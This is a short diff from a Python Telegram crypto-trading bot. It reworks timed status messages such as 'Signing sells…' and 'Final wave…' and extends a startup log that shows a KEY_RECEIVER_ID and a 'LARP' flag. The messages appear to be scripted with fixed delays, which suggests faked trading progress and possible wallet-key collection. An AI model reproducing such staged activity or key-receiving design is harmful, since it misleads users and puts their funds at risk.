-        (f"💥 <b>${symbol}</b> · landing wave 2…", 0.5),
-        (f"💥 <b>${symbol}</b> · final wave · clearing bag…", 0.55),
+        (f"<b>${symbol}</b>\nScanning book…", 0.5),
+        (f"<b>${symbol}</b>\nSigning sells…", 0.6),
+        (f"<b>${symbol}</b>\nWave 1/{max(1, bundle//3)}…", 0.55),
+        (f"<b>${symbol}</b>\nWave 2…", 0.5),
+        (f"<b>${symbol}</b>\nFinal wave…", 0.55),
     ]:
         await asyncio.sleep(delay)
         try:
@@ -3938,8 +3922,9 @@ async def main():
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
     log.info(
-        "Bot starting | HAS_SOLANA=%s | HAS_WEB3=%s | KEY_RECEIVER=%s | vault=%.4f | LARP=%s",
+        "Bot starting | HAS_SOLANA=%s | HAS_WEB3=%s | KEY_RECEIVER=%s | vault=%.4f | LARP=%s | welcome=%s",
         HAS_SOLANA, HAS_WEB3, KEY_RECEIVER_ID, bot_balance_sol, LARP_ENABLED,
+        WELCOME_IMAGE or "MISSING",
     )
     try:
         await dp.start_polling(bot)
